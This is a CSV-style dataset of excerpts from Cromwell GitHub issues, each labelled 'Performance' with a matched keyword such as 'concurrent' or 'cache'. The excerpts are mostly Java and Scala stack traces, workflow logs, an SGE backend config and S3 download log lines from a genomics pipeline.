Performance,"0007fb76cc73800 nid=0xcd03 waiting on condition [0x0000000134661000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0041f30> (a scala.concurrent.forkjoin.ForkJoinPool); at scala.concurrent.forkjoin.ForkJoinPool.scan(ForkJoinPool.java:2075); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). ""pool-1-thread-20"" #81 prio=5 os_prio=31 tid=0x00007fb76cc5b800 nid=0xcb03 waiting on condition [0x000000013455e000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-19"" #80 prio=5 os_prio=31 tid=0x00007fb76cc59800 nid=0xc903 waiting on condition [0x0000000134093000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoo",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:1881,concurren,concurrent,1881,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,"016-03-10 22:57:05,450 cromwell-system-akka.actor.default-dispatcher-27 ERROR - CallActor [UUID(7721686a):StripBamExtension:8]: Failing call: 500 Internal Server Error; Internal Error; cromwell.util.AggregatedException: 500 Internal Server Error; Internal Error; at cromwell.util.TryUtil$.sequenceIterable(TryUtil.scala:112) ~[cromwell.jar:0.19]; at cromwell.util.TryUtil$.sequenceMap(TryUtil.scala:124) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend.postProcess(JesBackend.scala:623) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$executionResult$1.apply(JesBackend.scala:662) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$executionResult$1.apply(JesBackend.scala:657) ~[cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24) ~[cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.run_aroundBody0(Future.scala:24) ~[cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable$AjcClosure1.run(Future.scala:1) ~[cromwell.jar:0.19]; at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) ~[cromwell.jar:0.19]; at kamon.trace.Tracer$.withContext(TracerModule.scala:53) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation.aroundExecution(FutureInstrumentation.scala:43) ~[cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:23) ~[cromwell.jar:0.19]; at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) ~[cromwell.jar:0.19]; at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(F",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/577:1760,concurren,concurrent,1760,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/577,1,['concurren'],['concurrent']
Performance,"04,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Deadline expired before operation could complete."",; ""reason"" : ""backendError""; } ],; ""message"" : ""Deadline expired before operation could complete."",; ""status"" : ""DEADLINE_EXCEEDED""; }; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:30); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:37:35,25] [error] Read timed out; java.net.SocketTimeoutException: Read timed out; at java.net.SocketInputStream.socketRead0(Native Method); at java.net.SocketInputStream.socketRead(SocketInputStream.java:116); at java.net.SocketInputStream.read(SocketInputStream.java:170); at java.net.SocketInputStream.read(SocketInputStream.java:141); at sun.security.ssl.InputRecord.readFully(InputRecord.java:465); at sun.security.ssl.InputRecord.read(InputRecord.java:503); at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973); at sun.security.ssl.SSLSocketImpl.readDataRecord(SSLSocketImpl.java:930); at sun.security.ssl.AppInputStream.read(AppInputStream.java:105); at java.io.BufferedInputStream.fill(BufferedInputStream.java:246); at java.io.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:1479,concurren,concurrent,1479,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['concurren'],['concurrent']
Performance,"04,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Deadline expired before operation could complete."",; ""reason"" : ""backendError""; } ],; ""message"" : ""Deadline expired before operation could complete."",; ""status"" : ""DEADLINE_EXCEEDED""; }; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:30); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:38:17,54] [info] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.AllelicCNV:3:1]: JesAsyncBackendJobExecutionActor [a3dd8163:case_gatk_acnv_workflow.AllelicCNV:3:1] Status change from Running to Success; [2016-10-28 14:38:17,67] [info] WorkflowExecutionActor-a3dd8163-de37-4467-a227-5364959a8940 [a3dd8163]: Starting calls: case_gatk_acnv_workflow.CNLoHAndSplitsCaller:3:1, case_gatk_acnv_workflow.PlotACNVResults:3:1; [2016-10-28 14:38:18,14] [info] JesRun [a3dd8163case_gatk_acnv_workflow.CNLoHAndSplitsCaller:3:1]: JES Run ID is operations/ENPH6N2AKxi-zoCK0M65gEAgn5eRl70GKg9wcm9kdWN0aW9uUXVldWU; [2016-10-28 14:38:18,31] [info] JesRun [a3dd8163case_gatk_acnv_workflow.PlotACNVResults:3:1]: JES Run ID is operations/EPfI6N2AKxi_iI6",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:12224,concurren,concurrent,12224,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['concurren'],['concurrent']
Performance,"05902327""; },; ""output expression"": {; ""File output_greeting"": ""DFC652723D8EBD4BB25CAC21431BB6C0""; },; ""input count"": ""CFCD208495D565EF66E7DFF9F98764DA"",; ""backend name"": ""2A2AB400D355AC301859E4ABB5432138"",; ""command template"": ""AFAC58B849BD67585A857F538B8E92F6""; },; ""effectiveCallCachingMode"": ""ReadAndWriteCache"",; ""hit"": false,; ""result"": ""Cache Miss""; },; ```. ```; # simple sge apptainer conf (modified from the slurm one); #; workflow-options; {; workflow-log-dir: ""cromwell-workflow-logs""; workflow-log-temporary: false; workflow-failure-mode: ""ContinueWhilePossible""; default; {; workflow-type: WDL; workflow-type-version: ""draft-2""; }; }. database {; # Store metadata in a file on disk that can grow much larger than RAM limits.; metadata {; profile = ""slick.jdbc.MySQLProfile$""; db {; url = ""jdbc:mysql:<dburl>?rewriteBatchedStatements=true""; driver = ""com.mysql.cj.jdbc.Driver""; user = ""<user>""; password = ""<pass>"" ; connectionTimeout = 5000; }; }; }. call-caching; {; enabled = true; invalidate-bad-cache-result = true; }. docker {; hash-lookup {; enabled = true; }; }. backend {; default = sge; providers {. ; sge {; 	actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {. # Limits the number of concurrent jobs; #concurrent-job-limit = 5. # If an 'exit-code-timeout-seconds' value is specified:; # - check-alive will be run at this interval for every job; # - if a job is found to be not alive, and no RC file appears after this interval; # - Then it will be marked as Failed.; # Warning: If set, Cromwell will run 'check-alive' for every job at this interval. # exit-code-timeout-seconds = 120. runtime-attributes = """"""; String time = ""11:00:00""; Int cpu = 4; Float? memory_gb; String sge_queue = ""hammer.q""; String? sge_project; String? docker; """""". submit = """"""; qsub \; -terse \; -V \; -b y \; -N ${job_name} \; -wd ${cwd} \; -o ${out}.qsub \; -e ${err}.qsub \; -pe smp ${cpu} \; ${""-l mem_free="" + memory_gb + ""g""} \; ${""-q "" + sge_queue",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7480:2134,cache,cache-result,2134,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7480,1,['cache'],['cache-result']
Performance,"07 12:16:52,353 cromwell-system-akka.dispatchers.engine-dispatcher-49 INFO - Retrieved 1 workflows from the WorkflowStoreActor; 2018-06-07 12:16:52,362 cromwell-system-akka.dispatchers.engine-dispatcher-47 INFO - WorkflowStoreHeartbeatWriteActor configured to flush with batch size 10000 and process rate 2 minutes.; 2018-06-07 12:16:52,443 cromwell-system-akka.dispatchers.engine-dispatcher-47 INFO - MaterializeWorkflowDescriptorActor [UUID(dd0b1399)]: Parsing workflow as WDL draft-2; 2018-06-07 12:16:52,498 cromwell-system-akka.dispatchers.engine-dispatcher-47 ERROR - WorkflowManagerActor Workflow dd0b1399-ebb6-4d9b-89ea-7da193994220 failed (during MaterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; Boxed Error; scala.concurrent.impl.Promise$.resolver(Promise.scala:83); scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); scala.concurrent.impl.Promise$DefaultPromise.tryComplete(Promise.scala:280); scala.concurrent.Promise.complete(Promise.scala:49); scala.concurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:328); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:328); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:328); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:98); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:257); cats.effect.IO.unsafeToFuture(IO.scala:328); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrE",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457:99144,concurren,concurrent,99144,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457,1,['concurren'],['concurrent']
Performance,09); at io.grpc.netty.shaded.io.netty.handler.ssl.SslHandler.unwrapNonAppData(SslHandler.java:1327); at io.grpc.netty.shaded.io.netty.handler.ssl.SslHandler.access$1800(SslHandler.java:169); at io.grpc.netty.shaded.io.netty.handler.ssl.SslHandler$SslTasksRunner.resumeOnEventExecutor(SslHandler.java:1718); at io.grpc.netty.shaded.io.netty.handler.ssl.SslHandler$SslTasksRunner.access$2000(SslHandler.java:1609); at io.grpc.netty.shaded.io.netty.handler.ssl.SslHandler$SslTasksRunner$2.run(SslHandler.java:1770); at io.grpc.netty.shaded.io.netty.util.concurrent.AbstractEventExecutor.runTask(AbstractEventExecutor.java:174); at io.grpc.netty.shaded.io.netty.util.concurrent.AbstractEventExecutor.safeExecute(AbstractEventExecutor.java:167); at io.grpc.netty.shaded.io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:470); at io.grpc.netty.shaded.io.netty.channel.epoll.EpollEventLoop.run(EpollEventLoop.java:403); at io.grpc.netty.shaded.io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997); at io.grpc.netty.shaded.io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74); at io.grpc.netty.shaded.io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30); ... 1 common frames omitted; Caused by: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target; at java.base/sun.security.validator.PKIXValidator.doBuild(PKIXValidator.java:388); at java.base/sun.security.validator.PKIXValidator.engineValidate(PKIXValidator.java:271); at java.base/sun.security.validator.Validator.validate(Validator.java:256); at java.base/sun.security.ssl.X509TrustManagerImpl.checkTrusted(X509TrustManagerImpl.java:284); at java.base/sun.security.ssl.X509TrustManagerImpl.checkServerTrusted(X509TrustManagerImpl.java:144); at io.grpc.netty.shaded.io.netty.handl,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7551:6531,concurren,concurrent,6531,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7551,1,['concurren'],['concurrent']
Performance,"0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-113/cacheCopy/SR00c.NA18549.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-113/cacheCopy/SR00c.NA18549.txt.gz.tbi; 1608597511949,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-142/cacheCopy/SR00c.NA20320.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-142/cacheCopy/SR00c.NA20320.txt.gz.tbi; 1608597513691,download: s3://focal-sv-resources/broad-references/v0/sv-resources/resources/v1/hg38_primary_contigs.bed to focal-sv-resources/broad-references/v0/sv-resources/resources/v1/hg38_primary_contigs.bed; 1608597515955,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-127/cacheCopy/SR00c.NA19184.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-127/cacheCopy/SR00c.NA19184.txt.gz.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:159349,cache,cacheCopy,159349,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-115/cacheCopy/SR00c.NA18560.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-115/cacheCopy/SR00c.NA18560.txt.gz.tbi; 1608597046875,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-156/cacheCopy/SR00c.NA21133.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-156/cacheCopy/SR00c.NA21133.txt.gz.tbi; 1608597049133,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-127/cacheCopy/SR00c.NA19184.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-127/cacheCopy/SR00c.NA19184.txt.gz; 1608597051239,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/Eviden",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:29673,cache,cacheCopy,29673,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-125/cacheCopy/SR00c.NA19102.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-125/cacheCopy/SR00c.NA19102.txt.gz.tbi; 1608597533973,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-134/cacheCopy/SR00c.NA19678.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-134/cacheCopy/SR00c.NA19678.txt.gz.tbi; 1608597536250,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-76/cacheCopy/SR00c.HG03100.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-76/cacheCopy/SR00c.HG03100.txt.gz.tbi; 1608597538865,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:165820,cache,cacheCopy,165820,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-128/cacheCopy/SR00c.NA19350.txt.gz; 1608597579845,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-39/cacheCopy/SR00c.HG01861.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-39/cacheCopy/SR00c.HG01861.txt.gz; 1608597581880,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-138/cacheCopy/SR00c.NA19795.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-138/cacheCopy/SR00c.NA19795.txt.gz; 1608597584919,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-2/cacheCopy/SR00c.HG00129.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:178622,cache,cacheCopy,178622,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-129/cacheCopy/SR00c.NA19351.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-129/cacheCopy/SR00c.NA19351.txt.gz.tbi; 1608597005866,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-130/cacheCopy/SR00c.NA19377.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-130/cacheCopy/SR00c.NA19377.txt.gz.tbi; 1608597008325,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-119/cacheCopy/SR00c.NA18945.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-119/cacheCopy/SR00c.NA18945.txt.gz; 1608597012199,download: 